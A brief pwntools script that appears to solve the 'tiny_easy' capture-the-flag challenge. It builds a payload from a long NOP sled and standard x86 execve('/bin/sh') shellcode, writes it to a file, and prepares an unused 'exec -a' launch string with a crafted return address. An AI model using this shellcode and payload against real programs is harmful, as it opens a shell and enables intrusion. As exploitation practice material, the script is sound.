from pwn import *

context.log_level = 'debug'

shellcode_x86 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = "\x90\x90\x90\x90" * 0x4096 + shellcode_x86

p = 'exec -a "\x1c\x52\x80\xff"' + " ./tiny_easy "+ payload
w = open("test","wb")
w.write(payload)
w.close()

